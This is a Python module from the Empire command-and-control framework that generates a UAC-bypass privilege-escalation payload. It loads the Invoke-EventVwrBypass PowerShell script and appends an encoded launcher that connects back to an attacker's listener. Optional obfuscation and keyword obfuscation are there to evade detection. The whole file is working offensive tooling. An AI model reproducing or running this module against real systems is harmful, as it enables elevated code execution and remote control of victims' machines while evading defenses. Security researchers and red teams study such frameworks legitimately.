from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False,
                 obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False

        listenerName = params['Listener']

        # staging options
        userAgent = params['UserAgent']

        proxy = params['Proxy']
        proxyCreds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        ObfuscateCommand = params['ObfuscateCommand']

        # read in the common module source code
        moduleSource = main_menu.installPath + "/data/module_source/privesc/Invoke-EventVwrBypass.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscation_command)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(moduleSource))

        moduleCode = f.read()
        f.close()

        script = moduleCode

        if not main_menu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listenerName)
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
                                                           obfuscate=obfuscate,
                                                           obfuscationCommand=ObfuscateCommand, userAgent=userAgent,
                                                           proxy=proxy,
                                                           proxyCreds=proxyCreds, bypasses=params['Bypasses'])

            encScript = launcher.split(" ")[-1]
            if launcher == "":
                return handle_error_message("[!] Error in launcher generation.")
            else:
                scriptEnd = "Invoke-EventVwrBypass -Command \"%s\"" % (encScript)

        if obfuscate:
            scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=scriptEnd,
                                          obfuscationCommand=obfuscation_command)
        script += scriptEnd
        script = data_util.keyword_obfuscation(script)

        return script
